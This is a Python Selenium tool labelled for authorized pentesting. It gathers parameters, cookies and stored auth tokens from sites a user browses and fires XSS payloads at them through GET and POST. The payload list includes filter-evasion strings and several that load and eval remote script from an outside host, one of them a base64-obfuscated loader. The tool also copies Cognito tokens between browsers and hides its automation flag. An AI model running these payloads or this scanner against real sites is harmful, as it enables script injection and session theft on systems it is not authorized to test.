from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
import time
import re
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import os
import json
import threading
import queue
import random
import logging
import sys
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# Suppress urllib3 InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging with DEBUG level for detailed diagnostics
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', force=True)
print("Script starting...")

# File constants
PARAMETERS_OUTPUT_FILE = "collected_parameters.json"
COOKIES_OUTPUT_FILE = "collected_cookies.json"
XSS_RESULTS_FILE = "xss_results.json"
XSS_ALERTS_FILE = "xss_alerts.json"
STATE_FILE = "tested_params.json"

# XSS Payloads
PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    'javascript:alert("xss")',
    '";alert("xss");',
    '%3Cscript%3Ealert("xss")%3C/script%3E',
    '<svg onload=alert("xss")>',
    '\'"><script src="https://js.rip/shootweb"></script>',
    '<script src="https://js.rip/shootweb"></script>',
    "\"><img src=https://google.com/ThisSourceIsNotReal id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3Nob290d2ViIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>",
    "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"https://js.rip/shootweb\");a.send();</script>",
    "-->'\"/></sCript><svG x=\">\" onload=(co\u006efirm)``>",
    "<svg%0Ao%00nload=%09((pro\u006dpt))()//",
    "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm( 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"https://js.rip/shootweb\">"
]

class LiveXSSTester:
    def __init__(self, config_path="config.json"):
        self.driver = None
        self.test_driver = None
        self.param_queue = queue.Queue()
        self.collected_params = set()
        self.processed_param_names = set()
        self.current_domain = None
        self.vulnerabilities_found = 0
        self.shutdown_event = threading.Event()
        self.config = self.load_config(config_path)
        self.whitelist = self.config.get("whitelist", [])
        self.max_threads = self.config.get("max_threads", 1)
        self.delay_range = self.config.get("delay_range", [0.2, 0.3])
        self.token_keys = self.config.get("token_keys", {
            "id_token": ["id_token", "CognitoIdentityServiceProvider.*.idToken"],
            "access_token": ["access_token", "CognitoIdentityServiceProvider.*.accessToken"],
            "refresh_token": ["refresh_token", "CognitoIdentityServiceProvider.*.refreshToken"]
        })
        self.requests_session = requests.Session()
        retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=retries)
        self.requests_session.mount('http://', adapter)
        self.requests_session.mount('https://', adapter)
        self.load_state()
        print("LiveXSSTester initialized")

    def load_config(self, config_path):
        default_config = {
            "whitelist": [],
            "max_threads": 1,
            "delay_range": [0.2, 0.3],
            "token_keys": {
                "id_token": ["id_token", "CognitoIdentityServiceProvider.*.idToken"],
                "access_token": ["access_token", "CognitoIdentityServiceProvider.*.accessToken"],
                "refresh_token": ["refresh_token", "CognitoIdentityServiceProvider.*.refreshToken"]
            }
        }
        if os.path.exists(config_path):
            with open(config_path, "r") as f:
                config = json.load(f)
            default_config.update(config)
        return default_config

    def save_state(self):
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(list(self.processed_param_names), f)
        logging.info(f"State saved to {STATE_FILE}")

    def load_state(self):
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
            logging.info(f"Cleared {STATE_FILE} to reset state")
        self.processed_param_names = set()

    def append_to_file(self, data, filename=PARAMETERS_OUTPUT_FILE):
        with open(filename, "a", encoding="utf-8") as f:
            f.write("# Generated by LiveTesterV0.11. For authorized pentesting only.\n")
            json.dump(data, f)
            f.write("\n")

    def save_cookies_to_file(self, cookies, filename=COOKIES_OUTPUT_FILE):
        cookie_dict = {cookie["name"]: cookie["value"] for cookie in cookies}
        with open(filename, "w", encoding="utf-8") as f:
            f.write("# Generated by LiveTesterV0.11. For authorized pentesting only.\n")
            json.dump(cookie_dict, f, indent=4)
        logging.info(f"Cookies saved to {filename}")
        return cookie_dict

    def is_in_scope(self, url):
        if not self.whitelist:
            return True
        domain = urlparse(url).netloc
        return any(whitelisted in domain for whitelisted in self.whitelist)

    def is_valid_url(self, url):
        """Check if URL is valid and not a data: URL."""
        parsed = urlparse(url)
        return parsed.scheme in ('http', 'https') and parsed.netloc and not url.startswith('data:')

    def extract_url_parameters(self, url):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        fragment_params = parse_qs(parsed_url.fragment)
        return set(query_params.keys()) | set(fragment_params.keys())

    def extract_page_parameters(self):
        params = set()
        soup = BeautifulSoup(self.driver.page_source, "html.parser")
        for tag in soup.find_all(["input", "textarea", "select"]):
            param_name = tag.get("name")
            if param_name and self.is_valid_parameter(param_name):
                params.add(param_name)
        for hidden in soup.find_all("input", type="hidden"):
            param_name = hidden.get("name")
            if param_name and self.is_valid_parameter(param_name):
                params.add(param_name)
        for link in soup.find_all("a", href=True):
            parsed_url = urlparse(link["href"])
            query_params = parse_qs(parsed_url.query)
            params.update(query_params.keys())
        ajax_params = self.extract_ajax_parameters()
        params.update(ajax_params)
        return params

    def extract_ajax_parameters(self):
        try:
            network_requests = self.driver.execute_script("""
                return performance.getEntriesByType('resource')
                    .filter(e => e.initiatorType === 'xmlhttprequest' || e.initiatorType === 'fetch')
                    .map(e => e.name);
            """)
            params = set()
            for url in network_requests:
                if self.is_valid_url(url):
                    query_params = parse_qs(urlparse(url).query)
                    params.update(query_params.keys())
            return params
        except Exception as e:
            logging.warning(f"Error extracting AJAX parameters: {e}")
            return set()

    def extract_cookies(self):
        try:
            return self.driver.get_cookies()
        except Exception as e:
            logging.warning(f"Error extracting cookies: {e}")
            return []

    def is_valid_parameter(self, param_name):
        if not param_name:
            return False
        if re.match(r'.*\[.*\]', param_name):
            logging.debug(f"Excluded parameter due to format: {param_name}")
            return False
        return not param_name.startswith('_')

    def setup_navigation_driver(self):
        print("Setting up navigation driver...")
        chrome_options = Options()
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_argument("--disable-webrtc")
        chrome_options.add_argument("--disable-features=WebRtcHideLocalIpsWithMdns")
        chrome_options.add_argument("--log-level=3")
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.accept_insecure_certs = True
        service = Service(log_path=os.devnull)
        for attempt in range(3):
            try:
                self.driver = webdriver.Chrome(options=chrome_options, service=service)
                print("Navigation driver setup complete")
                return
            except Exception as e:
                logging.warning(f"Navigation driver setup failed (attempt {attempt+1}/3): {e}")
                time.sleep(2)
        logging.error("Failed to setup navigation driver after retries")
        sys.exit(1)

    def setup_test_driver(self):
        print("Setting up test driver...")
        chrome_options = Options()
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-webgl")
        chrome_options.add_argument("--enable-unsafe-swiftshader")
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--disable-webrtc")
        chrome_options.add_argument("--disable-features=WebRtcHideLocalIpsWithMdns")
        chrome_options.add_argument("--log-level=3")
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.accept_insecure_certs = True
        service = Service(log_path=os.devnull)
        for attempt in range(3):
            try:
                self.test_driver = webdriver.Chrome(options=chrome_options, service=service)
                self.test_driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                print("Test driver setup complete")
                return
            except Exception as e:
                logging.warning(f"Test driver setup failed (attempt {attempt+1}/3): {e}")
                time.sleep(2)
        logging.error("Failed to setup test driver after retries")
        sys.exit(1)

    def sync_test_driver_session(self, domain=None):
        cookies = self.extract_cookies()
        target_domain = domain or self.current_domain
        if not target_domain or not self.is_valid_url(target_domain):
            logging.warning(f"Invalid or unset domain ({target_domain}), skipping session sync")
            return
        try:
            logging.debug(f"Attempting to navigate test driver to {target_domain}")
            self.test_driver.get(target_domain)
            self.test_driver.delete_all_cookies()
            for cookie in cookies:
                try:
                    cookie_domain = cookie.get("domain", urlparse(target_domain).netloc)
                    if not cookie_domain or cookie_domain.startswith("."):
                        cookie_domain = urlparse(target_domain).netloc
                    cookie_copy = cookie.copy()
                    cookie_copy["domain"] = cookie_domain
                    self.test_driver.add_cookie(cookie_copy)
                    self.requests_session.cookies.set(
                        cookie["name"], cookie["value"], domain=cookie_domain
                    )
                except Exception as e:
                    logging.warning(f"Failed to add cookie {cookie['name']} for {target_domain}: {e}")
            logging.info(f"Cookies synced to test driver and requests session for {target_domain}")
        except Exception as e:
            logging.error(f"Error syncing cookies to test driver for {target_domain}: {e}")

        try:
            tokens = {}
            for token_type, keys in self.token_keys.items():
                for key in keys:
                    if '*' in key:
                        pattern = key.replace('*', '.*')
                        js_script = f"""
                            let result = {{}};
                            try {{
                                for (let i = 0; i < localStorage.length; i++) {{
                                    let k = localStorage.key(i);
                                    if (new RegExp('{pattern}').test(k)) {{
                                        result[k] = localStorage.getItem(k);
                                    }}
                                }}
                                for (let i = 0; i < sessionStorage.length; i++) {{
                                    let k = sessionStorage.key(i);
                                    if (new RegExp('{pattern}').test(k)) {{
                                        result[k] = sessionStorage.getItem(k);
                                    }}
                                }}
                            }} catch (e) {{
                                return {{ error: e.message }};
                            }}
                            return result;
                        """
                        storage_items = self.driver.execute_script(js_script)
                        if isinstance(storage_items, dict) and 'error' in storage_items:
                            logging.warning(f"Failed to access storage for {target_domain}: {storage_items['error']}")
                            continue
                        if storage_items:
                            tokens.update(storage_items)
                            break
            if tokens:
                self.test_driver.get(target_domain)
                for key, value in tokens.items():
                    if value:
                        try:
                            self.test_driver.execute_script(f"""
                                try {{
                                    localStorage.setItem('{key}', '{value}');
                                    sessionStorage.setItem('{key}', '{value}');
                                }} catch (e) {{}}
                            """)
                        except Exception as e:
                            logging.warning(f"Failed to set storage item {key} for {target_domain}: {e}")
                logging.info(f"Synced tokens to test driver for {target_domain}: {list(tokens.keys())}")
                if any(k in tokens for k in self.token_keys["access_token"]):
                    access_token = next((tokens[k] for k in self.token_keys["access_token"] if k in tokens), None)
                    if access_token:
                        self.requests_session.headers.update({"Authorization": f"Bearer {access_token}"})
                        logging.info("Updated requests session with Authorization header")
            else:
                logging.debug(f"No tokens found in localStorage/sessionStorage for {target_domain}")
        except Exception as e:
            logging.warning(f"Failed to sync tokens from storage for {target_domain}: {e}")

    def check_and_handle_alert(self, method, url, payload):
        for _ in range(5):
            try:
                alert = Alert(self.test_driver)
                alert_text = alert.text
                alert.accept()
                logging.info(f"Alert detected for {method} {url}: {alert_text}")
                return alert_text
            except Exception as e:
                logging.debug(f"No alert detected on attempt {_+1} for {url}: {e}")
                time.sleep(1)
        logging.warning(f"No alert detected after 5 attempts for {method} {url}")
        return None

    def check_for_xss(self, method, url, payload):
        if self.shutdown_event.is_set():
            logging.info("Shutdown detected, skipping XSS check")
            return False
        alert_text = self.check_and_handle_alert(method, url, payload)
        network_requests = self.test_driver.execute_script("""
            return performance.getEntriesByType('resource').map(e => e.name);
        """)
        xss_detected = any("js.rip" in req for req in network_requests)
        soup = BeautifulSoup(self.test_driver.page_source, "html.parser")
        dom_reflection = payload in self.test_driver.page_source
        js_execution = self.test_driver.execute_script("""
            return window.alertCalled || window.confirmCalled || window.promptCalled || false;
        """) if self.test_driver else False
        if alert_text or xss_detected or dom_reflection or js_execution:
            self.vulnerabilities_found += 1
            with open(XSS_ALERTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "method": method,
                    "url": url,
                    "payload": payload,
                    "alert_text": alert_text,
                    "network_triggered": xss_detected,
                    "dom_reflection": dom_reflection,
                    "js_execution": js_execution,
                    "status_code": self.test_driver.execute_script("return document.readyState === 'complete' ? 200 : 0"),
                    "timestamp": time.time()
                }) + "\n")
            return True
        return False

    def fetch_page_content_selenium_get(self, url, payload):
        if self.shutdown_event.is_set():
            logging.info("Shutdown detected, skipping GET request")
            return None
        if not self.is_valid_url(url):
            logging.warning(f"Skipping GET request to invalid URL: {url}")
            return None
        try:
            access_token = None
            try:
                access_token = self.test_driver.execute_script("""
                    try {
                        return localStorage.getItem('access_token') || sessionStorage.getItem('access_token') ||
                               (function() {
                                   for (let i = 0; i < localStorage.length; i++) {
                                       let k = localStorage.key(i);
                                       if (/CognitoIdentityServiceProvider.*.accessToken/.test(k)) {
                                           return localStorage.getItem(k);
                                       }
                                   }
                                   for (let i = 0; i < sessionStorage.length; i++) {
                                       let k = sessionStorage.key(i);
                                       if (/CognitoIdentityServiceProvider.*.accessToken/.test(k)) {
                                           return sessionStorage.getItem(k);
                                       }
                                   }
                                   return null;
                               })();
                    } catch (e) {
                        return null;
                    }
                """)
            except Exception as e:
                logging.warning(f"Failed to access storage for access_token in GET {url}: {e}")
            if access_token:
                self.requests_session.headers.update({"Authorization": f"Bearer {access_token}"})
                logging.debug("Updated requests session with Authorization header for GET")
            response = self.requests_session.head(url, timeout=5, verify=False)
            logging.debug(f"Rate limit check response headers for {url}: {response.headers}")
            if response.status_code == 429:
                logging.warning(f"Rate limit detected for {url}, increasing delay")
                self.delay_range = [d * 2 for d in self.delay_range]
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
            elif response.status_code in (403, 503):
                logging.warning(f"Access restricted for {url} (status {response.status_code}), slowing down")
                self.delay_range = [d * 1.5 for d in self.delay_range]
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
            self.test_driver.get(url)
            WebDriverWait(self.test_driver, 20).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            if "captcha" in self.test_driver.page_source.lower():
                logging.warning(f"CAPTCHA detected on {url}, skipping test")
                return None
            self.test_driver.execute_script("""
                window.alertCalled = false;
                window.confirmCalled = false;
                window.promptCalled = false;
                window.alert = function() { window.alertCalled = true; };
                window.confirm = function() { window.confirmCalled = true; };
                window.prompt = function() { window.promptCalled = true; };
            """)
            self.check_for_xss("GET", url, payload)
            return self.test_driver.page_source
        except Exception as e:
            logging.error(f"Error fetching GET {url}: {e}")
            return None

    def fetch_page_content_selenium_post(self, url, param_name, payload):
        if self.shutdown_event.is_set():
            logging.info("Shutdown detected, skipping POST request")
            return None
        if not self.is_valid_url(url):
            logging.warning(f"Skipping POST request to invalid URL: {url}")
            return None
        try:
            access_token = None
            try:
                access_token = self.test_driver.execute_script("""
                    try {
                        return localStorage.getItem('access_token') || sessionStorage.getItem('access_token') ||
                               (function() {
                                   for (let i = 0; i < localStorage.length; i++) {
                                       let k = localStorage.key(i);
                                       if (/CognitoIdentityServiceProvider.*.accessToken/.test(k)) {
                                           return localStorage.getItem(k);
                                       }
                                   }
                                   for (let i = 0; i < sessionStorage.length; i++) {
                                       let k = sessionStorage.key(i);
                                       if (/CognitoIdentityServiceProvider.*.accessToken/.test(k)) {
                                           return sessionStorage.getItem(k);
                                       }
                                   }
                                   return null;
                               })();
                    } catch (e) {
                        return null;
                    }
                """)
            except Exception as e:
                logging.warning(f"Failed to access storage for access_token in POST {url}: {e}")
            if access_token:
                self.requests_session.headers.update({"Authorization": f"Bearer {access_token}"})
                logging.debug("Updated requests session with Authorization header for POST")
            response = self.requests_session.head(url, timeout=5, verify=False)
            logging.debug(f"Rate limit check response headers for {url}: {response.headers}")
            if response.status_code == 429:
                logging.warning(f"Rate limit detected for {url}, increasing delay")
                self.delay_range = [d * 2 for d in self.delay_range]
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
            elif response.status_code in (403, 503):
                logging.warning(f"Access restricted for {url} (status {response.status_code}), slowing down")
                self.delay_range = [d * 1.5 for d in self.delay_range]
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
            self.test_driver.get(url)
            WebDriverWait(self.test_driver, 20).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            if "captcha" in self.test_driver.page_source.lower():
                logging.warning(f"CAPTCHA detected on {url}, skipping test")
                return None
            soup = BeautifulSoup(self.test_driver.page_source, "html.parser")
            form = soup.find("form", {"method": re.compile("post", re.I)})
            if form and form.get("action"):
                action_url = urljoin(url, form["action"])
                if not self.is_valid_url(action_url):
                    logging.warning(f"Skipping POST due to invalid form action URL: {action_url}")
                    return None
                inputs = form.find_all("input", {"name": True})
                script = f"document.body.innerHTML = '<form id=\"xssForm\" method=\"POST\" action=\"{action_url}\">"
                for inp in inputs:
                    name = inp["name"]
                    value = payload if name == param_name else inp.get("value", "")
                    script += f'<input name="{name}" value="{value}">'
                script += "</form>; document.getElementById('xssForm').submit();"
            else:
                script = f"""
                document.body.innerHTML = '<form id="xssForm" method="POST" action="{url}"><input name="{param_name}" value="{payload}"></form>';
                document.getElementById('xssForm').submit();
                """
            self.test_driver.execute_script(script)
            WebDriverWait(self.test_driver, 20).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            if "captcha" in self.test_driver.page_source.lower():
                logging.warning(f"CAPTCHA detected on {url} after POST, skipping test")
                return None
            self.test_driver.execute_script("""
                window.alertCalled = false;
                window.confirmCalled = false;
                window.promptCalled = false;
                window.alert = function() { window.alertCalled = true; };
                window.confirm = function() { window.confirmCalled = true; };
                window.prompt = function() { window.promptCalled = true; };
            """)
            self.check_for_xss("POST", f"{url}?{param_name}={payload}", payload)
            return self.test_driver.page_source
        except Exception as e:
            logging.error(f"Error fetching POST {url} with {param_name}={payload}: {e}")
            return None

    def test_xss_combination(self, target_url, payloads):
        if self.shutdown_event.is_set():
            logging.info(f"Shutdown detected, skipping XSS test for {target_url}")
            return
        if not self.is_valid_url(target_url):
            logging.warning(f"Skipping XSS test for invalid URL: {target_url}")
            return
        logging.info(f"Starting XSS test for {target_url}")
        if not self.is_in_scope(target_url):
            logging.warning(f"URL {target_url} is out of scope, skipping")
            return
        param_name = target_url.split('?')[-1].rstrip('=')
        base_url = target_url.split('?')[0]
        domain = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
        self.current_domain = domain
        self.sync_test_driver_session(domain)

        for payload in payloads:
            if self.shutdown_event.is_set():
                logging.info("Shutdown detected, interrupting XSS test")
                break
            get_combination = f"{target_url}{payload}"
            logging.info(f"Testing GET: {get_combination}")
            self.fetch_page_content_selenium_get(get_combination, payload)
            with open(XSS_RESULTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({"method": "GET", "url": get_combination, "timestamp": time.time()}) + "\n")

            logging.info(f"Testing POST: {base_url} with {param_name}={payload}")
            self.fetch_page_content_selenium_post(base_url, param_name, payload)
            with open(XSS_RESULTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({"method": "POST", "url": f"{base_url}?{param_name}={payload}", "timestamp": time.time()}) + "\n")

            delay = random.uniform(self.delay_range[0], self.delay_range[1])
            time.sleep(delay)
        logging.info(f"Completed XSS test for {target_url}")

    def xss_testing_thread(self):
        self.setup_test_driver()
        logging.debug("XSS testing thread started")
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while not self.shutdown_event.is_set():
                try:
                    logging.debug(f"Current param_queue size: {self.param_queue.qsize()}")
                    target_url = self.param_queue.get(timeout=0.1)
                    logging.info(f"Dequeued URL for testing: {target_url}")
                    if not self.is_valid_url(target_url):
                        logging.warning(f"Skipping invalid URL from queue: {target_url}")
                        self.param_queue.task_done()
                        continue
                    executor.submit(self.test_xss_combination, target_url, PAYLOADS)
                    self.param_queue.task_done()
                except queue.Empty:
                    logging.debug("Queue empty, waiting for new parameters")
                    continue
                except Exception as e:
                    logging.error(f"Testing thread error for {target_url if 'target_url' in locals() else 'unknown URL'}: {e}")
                    self.param_queue.task_done()
            logging.info("XSS testing thread shutting down")
            executor.shutdown(wait=False, cancel_futures=True)

    def cleanup_drivers(self):
        logging.info("Initiating cleanup...")
        self.shutdown_event.set()
        try:
            if self.driver:
                try:
                    self.driver.delete_all_cookies()
                    self.driver.quit()
                except Exception as e:
                    logging.warning(f"Error closing navigation driver: {e}")
                finally:
                    self.driver = None
            if self.test_driver:
                try:
                    self.test_driver.delete_all_cookies()
                    self.test_driver.quit()
                except Exception as e:
                    logging.warning(f"Error closing test driver: {e}")
                finally:
                    self.test_driver = None
            self.requests_session.close()
            logging.info("Drivers and requests session cleaned up")
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    def monitor_and_test(self):
        for filename in [PARAMETERS_OUTPUT_FILE, COOKIES_OUTPUT_FILE, XSS_RESULTS_FILE, XSS_ALERTS_FILE]:
            if os.path.exists(filename):
                os.remove(filename)

        print("WARNING: Ensure you have permission to test the target site. Unauthorized testing is illegal.")
        if input("Continue? (y/n): ").lower() != 'y':
            sys.exit(0)

        self.setup_navigation_driver()
        logging.info("Browser is open. Navigate as you wish. Press Ctrl+C to stop.")
        logging.info(f"Parameters saved to {PARAMETERS_OUTPUT_FILE}")
        logging.info(f"Cookies saved to {COOKIES_OUTPUT_FILE}")
        logging.info(f"XSS results saved to {XSS_RESULTS_FILE}")
        logging.info(f"XSS alerts saved to {XSS_ALERTS_FILE}")

        test_thread = threading.Thread(target=self.xss_testing_thread)
        test_thread.start()
        time.sleep(0.5)

        last_url = ""
        last_cookies = set()

        try:
            while not self.shutdown_event.is_set():
                current_url = self.driver.current_url
                if not self.is_valid_url(current_url):
                    logging.warning(f"Skipping parameter collection for invalid URL: {current_url}")
                    time.sleep(0.5)
                    continue
                if current_url != last_url:
                    if not self.is_in_scope(current_url):
                        logging.warning(f"URL {current_url} is out of scope, skipping parameter collection")
                        continue
                    logging.info(f"Processing: {current_url}")
                    last_url = current_url
                    base_url = urlparse(current_url).scheme + "://" + urlparse(current_url).netloc + urlparse(current_url).path
                    self.current_domain = urlparse(current_url).scheme + "://" + urlparse(current_url).netloc

                    url_params = self.extract_url_parameters(current_url)
                    page_params = self.extract_page_parameters()
                    cookie_params = {cookie["name"] for cookie in self.extract_cookies()}

                    all_params = url_params | page_params | cookie_params
                    all_params = {p for p in all_params if p and self.is_valid_parameter(p)}

                    logging.debug(f"Collected {len(all_params)} parameters: {all_params}")
                    for param in all_params:
                        formatted_output = f"{base_url}?{param}="
                        if not self.is_valid_url(formatted_output):
                            logging.warning(f"Skipping invalid parameter URL: {formatted_output}")
                            continue
                        if formatted_output not in self.collected_params:
                            self.append_to_file({"url": formatted_output, "timestamp": time.time()})
                            self.collected_params.add(formatted_output)
                            logging.info(f"New parameter found: {formatted_output}")
                        if param not in self.processed_param_names:
                            logging.debug(f"Queueing parameter {param} at {formatted_output}")
                            self.param_queue.put(formatted_output)
                            self.processed_param_names.add(param)
                            self.save_state()
                            logging.info(f"Parameter {param} queued for testing at: {formatted_output}")
                            logging.debug(f"Queue size after adding {param}: {self.param_queue.qsize()}")

                current_cookies = self.extract_cookies()
                current_cookie_names = {cookie["name"] for cookie in current_cookies}
                if current_cookie_names != last_cookies:
                    self.save_cookies_to_file(current_cookies)
                    self.sync_test_driver_session(self.current_domain)
                    last_cookies = current_cookie_names

                time.sleep(0.5)
        except KeyboardInterrupt:
            logging.info("Ctrl+C detected, initiating shutdown...")
            self.shutdown_event.set()
        finally:
            self.cleanup_drivers()
            with open("xss_summary.json", "w", encoding="utf-8") as f:
                json.dump({
                    "total_parameters": len(self.collected_params),
                    "tested_parameters": len(self.processed_param_names),
                    "vulnerabilities_found": self.vulnerabilities_found,
                    "recommendations": ["Sanitize inputs", "Implement CSP", "Escape user data"]
                }, f, indent=4)
            logging.info("Summary report generated at xss_summary.json")
            print("Script terminated")
            sys.exit(0)

def main():
    print("Entering main...")
    try:
        tester = LiveXSSTester()
        tester.monitor_and_test()
    except Exception as e:
        print(f"Error in main: {e}")
        logging.error(f"Error in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
